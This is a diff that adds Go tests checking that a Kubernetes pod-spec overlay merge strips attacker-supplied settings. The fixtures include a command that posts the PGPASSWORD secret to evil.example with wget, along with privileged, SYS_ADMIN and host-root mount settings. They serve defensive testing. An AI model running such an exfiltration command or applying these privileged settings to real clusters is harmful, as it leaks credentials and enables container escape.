@@ -253,6 +253,154 @@ func TestIsReservedEnvName(t *testing.T) {
 	}
 }
 
+func TestMergePodSpecOverlay_resealsCommandArgsEnvFrom(t *testing.T) {
+	base := corev1.PodSpec{
+		Containers: []corev1.Container{{
+			Name:    "api",
+			Image:   "sealed:v1",
+			Command: []string{"/entrypoint.sh"},
+			Args:    []string{"serve"},
+			Env:     []corev1.EnvVar{{Name: "PGPASSWORD", Value: "secret"}},
+		}},
+	}
+	overlay := corev1.PodSpec{
+		Containers: []corev1.Container{{
+			Name:    "api",
+			Command: []string{"sh", "-c", "wget --post-data=$PGPASSWORD https://evil.example"},
+			Args:    []string{"ignored"},
+			EnvFrom: []corev1.EnvFromSource{{Prefix: "X_"}},
+		}},
+	}
+	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
+	if err != nil {
+		t.Fatal(err)
+	}
+	c := got.Containers[0]
+	if len(c.Command) != 1 || c.Command[0] != "/entrypoint.sh" {
+		t.Fatalf("command not resealed: %+v", c.Command)
+	}
+	if len(c.Args) != 1 || c.Args[0] != "serve" {
+		t.Fatalf("args not resealed: %+v", c.Args)
+	}
+	if len(c.EnvFrom) != 0 {
+		t.Fatalf("envFrom should be cleared, got %+v", c.EnvFrom)
+	}
+}
+
+func TestMergePodSpecOverlay_stripsHostNamespacesAndPrivileged(t *testing.T) {
+	priv := true
+	shareNS := true
+	base := corev1.PodSpec{
+		Containers: []corev1.Container{{
+			Name:  "api",
+			Image: "sealed:v1",
+			Ports: []corev1.ContainerPort{{Name: "http", ContainerPort: 8080}},
+		}},
+	}
+	overlay := corev1.PodSpec{
+		HostNetwork:           true,
+		HostPID:               true,
+		HostIPC:               true,
+		ShareProcessNamespace: &shareNS,
+		ServiceAccountName:    "evil-sa",
+		Containers: []corev1.Container{
+			{
+				Name: "api",
+				SecurityContext: &corev1.SecurityContext{
+					Privileged:   &priv,
+					Capabilities: &corev1.Capabilities{Add: []corev1.Capability{"SYS_ADMIN"}},
+				},
+			},
+			{
+				Name:  "sidecar",
+				Image: "busybox",
+				SecurityContext: &corev1.SecurityContext{
+					Privileged:               &priv,
+					AllowPrivilegeEscalation: &priv,
+					Capabilities:             &corev1.Capabilities{Add: []corev1.Capability{"NET_ADMIN"}},
+				},
+			},
+		},
+		Volumes: []corev1.Volume{{
+			Name: "host-root",
+			VolumeSource: corev1.VolumeSource{
+				HostPath: &corev1.HostPathVolumeSource{Path: "/"},
+			},
+		}},
+	}
+	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got.HostNetwork || got.HostPID || got.HostIPC || got.ShareProcessNamespace != nil {
+		t.Fatalf("host namespaces not stripped: net=%v pid=%v ipc=%v share=%v",
+			got.HostNetwork, got.HostPID, got.HostIPC, got.ShareProcessNamespace)
+	}
+	if got.ServiceAccountName != "" {
+		t.Fatalf("serviceAccountName=%q want empty", got.ServiceAccountName)
+	}
+	if len(got.Volumes) != 0 {
+		t.Fatalf("hostPath volume should be dropped, got %+v", got.Volumes)
+	}
+	api := got.Containers[0]
+	if api.SecurityContext != nil {
+		t.Fatalf("managed securityContext should be resealed to nil base, got %+v", api.SecurityContext)
+	}
+	var sidecar *corev1.Container
+	for i := range got.Containers {
+		if got.Containers[i].Name == "sidecar" {
+			sidecar = &got.Containers[i]
+			break
+		}
+	}
+	if sidecar == nil {
+		t.Fatal("expected sidecar")
+	}
+	if sidecar.SecurityContext == nil || sidecar.SecurityContext.Privileged == nil || *sidecar.SecurityContext.Privileged {
+		t.Fatalf("sidecar privileged not stripped: %+v", sidecar.SecurityContext)
+	}
+	if len(sidecar.SecurityContext.Capabilities.Add) != 0 {
+		t.Fatalf("sidecar capability adds not stripped: %+v", sidecar.SecurityContext.Capabilities.Add)
+	}
+}
+
+func TestMergePodSpecOverlay_blocksMountPathCollision(t *testing.T) {
+	base := corev1.PodSpec{
+		Containers: []corev1.Container{{
+			Name:  "api",
+			Image: "sealed:v1",
+			VolumeMounts: []corev1.VolumeMount{{
+				Name:      "project",
+				MountPath: "/nominatim",
+			}},
+		}},
+		Volumes: []corev1.Volume{{Name: "project"}},
+	}
+	overlay := corev1.PodSpec{
+		Containers: []corev1.Container{{
+			Name: "api",
+			VolumeMounts: []corev1.VolumeMount{{
+				Name:      "evil",
+				MountPath: "/nominatim",
+			}},
+		}},
+		Volumes: []corev1.Volume{{
+			Name: "evil",
+			VolumeSource: corev1.VolumeSource{
+				EmptyDir: &corev1.EmptyDirVolumeSource{},
+			},
+		}},
+	}
+	got, err := mergePodSpecOverlay(base, mustPodSpecRaw(t, overlay), "api", "sealed:v1", corev1.PullIfNotPresent)
+	if err != nil {
+		t.Fatal(err)
+	}
+	mounts := got.Containers[0].VolumeMounts
+	if len(mounts) != 1 || mounts[0].Name != "project" {
+		t.Fatalf("expected only project mount at /nominatim, got %+v", mounts)
+	}
+}
+
 func envMap(env []corev1.EnvVar) map[string]string {
 	out := map[string]string{}
 	for _, e := range env {
